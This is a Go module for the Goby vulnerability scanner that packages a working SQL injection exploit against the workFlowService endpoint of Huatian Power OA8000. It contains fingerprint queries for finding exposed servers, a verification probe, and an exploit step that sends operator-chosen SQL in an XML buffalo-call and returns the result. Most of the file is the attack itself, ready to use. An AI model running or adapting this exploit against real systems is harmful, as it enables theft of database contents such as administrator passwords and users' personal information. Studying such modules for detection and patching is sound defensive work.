package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "OA8000 workFlowService SQL Injection",
    "Description": "<p>There is a SQL injection vulnerability in the workFlowService interface of Huatian Power OA 8000, through which an attacker can obtain sensitive database information</p>",
    "Product": "Huatian-OA8000",
    "Homepage": "http://www.oa8000.com",
    "DisclosureDate": "2022-03-23",
    "Author": "sharecast",
    "FofaQuery": "(body=\"/OAapp/WebObjects/OAapp.woa/\" && body=\"/OAapp/jsp\") || header=\"Path=/OAapp\"",
    "GobyQuery": "(body=\"/OAapp/WebObjects/OAapp.woa/\" && body=\"/OAapp/jsp\") || header=\"Path=/OAapp\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. Use WAF filtering</p><p>2. Please pay attention to the update of the homepage: <a href=\"http://www.8000.com/\">http://www.8000.com/</a></p>",
    "References": [
        "https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E5%8D%8E%E5%A4%A9OA/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9BOA%208000%E7%89%88%20workFlowService%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "select database()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/OAapp/bfapp/buffalo/workFlowService",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "text/xml"
                },
                "data_type": "text",
                "data": "<buffalo-call><method>getDataListForTree</method><string>select md5(0x0c)</string></buffalo-call>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "58c89562f58fd276f592420068db8c09",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/OAapp/bfapp/buffalo/workFlowService",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "text/xml"
                },
                "data_type": "text",
                "data": "<buffalo-call><method>getDataListForTree</method><string>{{{sql}}}</string></buffalo-call>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Information technology application innovation industry",
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [
        "CNVD-2021-46917"
    ],
    "CVSSScore": "7",
    "Translation": {
        "CN": {
            "Name": "华天动力 OA8000 workFlowService 接口存在SQL注入漏洞",
            "Product": "华天动力-OA8000",
            "Description": "<p>华天动力OA 8000版 workFlowService接口存在SQL注入漏洞，攻击者通过漏洞可获取数据库敏感信息<br></p>",
            "Recommendation": "<p>1、使用WAF过滤</span></p><p>2、请关注厂商主页更新： <a href=\"http://www.oa8000.com/\">http://www.oa8000.com/</a></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br><br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "信创",
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "OA8000 workFlowService SQL Injection",
            "Product": "Huatian-OA8000",
            "Description": "<p>There is a SQL injection vulnerability in the workFlowService interface of Huatian Power OA 8000, through which an attacker can obtain sensitive database information<br></p>",
            "Recommendation": "<p>1. Use WAF filtering</p><p>2. Please pay attention to the update of the homepage: <a href=\"http://www.8000.com/\">http://www.8000.com/</a></p>",
            "Impact": "<p><br>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br><br><br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "Information technology application innovation industry",
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
